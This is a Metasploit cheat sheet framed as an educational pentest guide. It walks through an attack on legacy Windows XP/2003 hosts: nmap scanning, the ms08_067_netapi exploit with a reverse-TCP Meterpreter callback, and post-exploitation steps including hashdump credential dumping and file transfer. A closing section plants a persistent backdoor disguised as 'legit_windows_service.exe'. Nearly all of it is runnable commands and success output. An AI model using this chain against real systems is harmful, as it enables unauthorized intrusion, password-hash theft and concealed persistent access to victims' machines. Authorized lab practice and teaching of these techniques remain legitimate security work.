## **Metasploit Framework Cheat Sheet: Targeting Legacy Windows Systems**

**Disclaimer:** This guide is for **educational purposes only**. Use these techniques only on systems you own or have explicit, written permission to test. Unauthorized access to computer systems is illegal.

This guide simulates a penetration test against a vulnerable Windows system (e.g., Windows XP SP0, Windows Server 2003) common in the late 2000s.

---

### **Phase 1: Reconnaissance (`nmap`)**

Before launching any exploit, you must identify your target and find its weaknesses.

**Objective:** Discover active hosts and identify open ports/running services on the target machine.

**Key Commands:**
```bash
# Basic TCP SYN scan on a network range
nmap -sS 192.168.1.0/24

# Aggressive scan with OS and service version detection on a specific target
nmap -A -T4 192.168.1.50

# Check for specific SMB services (often the source of classic vulnerabilities)
nmap --script smb-os-discovery.nse -p 445 192.168.1.50

# Look for NetBIOS information (port 139)
nmap -sU -sS --script nbstat.nse -p 137,139 192.168.1.50
```

**Example Output:**
```
Host is up (0.00075s latency).
Not shown: 991 filtered ports
PORT     STATE  SERVICE      VERSION
135/tcp  open   msrpc        Microsoft Windows RPC
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
MAC Address: 00:0C:29:XX:XX:XX (VMware)
Device type: general purpose
Running: Microsoft Windows XP|2003
OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_2003::sp1
OS details: Microsoft Windows XP SP2 or Windows 2003 SP1
...
```
*Finding:* The target is running an old Windows OS (XP/2003) with SMB ports (139, 445) open. This is a prime candidate for the famous `ms08_067_netapi` vulnerability.

---

### **Phase 2: Exploitation (`msfconsole`)**

**Objective:** Leverage the identified vulnerability to gain initial access to the target system.

**Step 1: Start Metasploit and select the exploit.**
```bash
# Start the Metasploit console
msfconsole

# Search for exploits related to 'ms08_067'
msf6 > search ms08_067

# Select the famous Server Service Vulnerability
msf6 > use exploit/windows/smb/ms08_067_netapi
```

**Step 2: Configure the exploit options.**
```bash
# Show available options for the module
msf6 exploit(windows/smb/ms08_067_netapi) > show options

# Set the target host's IP address (from our nmap scan)
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.1.50

# Set the payload. A reverse TCP Meterpreter is a powerful choice.
msf6 exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp

# Configure the payload options. LHOST is YOUR machine's IP.
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.1.100
msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4444

# It's crucial to set the correct target from the module's list (show targets)
msf6 exploit(windows/smb/ms08_067_netapi) > set target 0

# You can also set a custom WORKSPACE for organization
msf6 exploit(windows/smb/ms08_067_netapi) > setg WORKSPACE Legacy_Windows_Pentest
```

**Step 3: Launch the exploit.**
```bash
# Run the exploit
msf6 exploit(windows/smb/ms08_067_netapi) > run

# or use the 'exploit' command
msf6 exploit(windows/smb/ms08_067_netapi) > exploit
```

**Successful Output:**
```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] 192.168.1.50:445 - Automatically detecting the target...
[*] 192.168.1.50:445 - Fingerprint: Windows XP - Service Pack 0 - lang:English
[*] 192.168.1.50:445 - Selected Target: Windows XP SP0 English (AlwaysOn NX)
[*] 192.168.1.50:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175174 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.50:1033) at 2023-10-26 14:35:22 -0400

meterpreter >
```
*Success!* You now have a **Meterpreter session**—a powerful, flexible shell on the target machine.

---

### **Phase 3: Post-Exploitation (`meterpreter`)**

**Objective:** Explore the compromised system, maintain access, and extract information.

**Key Meterpreter Commands:**
```bash
# Get basic system info
meterpreter > sysinfo

# See the user context we're running under
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM  # <- Best case scenario!

# Navigate the file system (use standard cd, ls, pwd commands)
meterpreter > pwd
C:\WINDOWS\system32
meterpreter > search -f *.txt -d C:\Documents and Settings\

# Upload a file to the target
meterpreter > upload /path/to/local/file.exe C:\\Windows\\Temp\\file.exe

# Download a file from the target
meterpreter > download C\\boot.ini /tmp/

# Dump password hashes for cracking (requires SYSTEM privileges)
meterpreter > hashdump

# Open an interactive system shell (cmd.exe)
meterpreter > shell
Process 3840 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
NT AUTHORITY\SYSTEM

C:\WINDOWS\system32>exit

# Background the session to return to msfconsole
meterpreter > background
[*] Backgrounding session 1...
```

### **Bonus: Persistence**

To ensure you can get back in, you can create a persistent backdoor.

```bash
# In the backgrounded Metasploit session, use the 'persistence' script
msf6 > use post/windows/manage/persistence_exe
msf6 post(windows/manage/persistence_exe) > set SESSION 1
msf6 post(windows/manage/persistence_exe) > set REXEPATH /tmp/backdoor.exe
msf6 post(windows/manage/persistence_exe) > set REXENAME "legit_windows_service.exe"
msf6 post(windows/manage/persistence_exe) > set STARTUP SERVICE
msf6 post(windows/manage/persistence_exe) > run
```

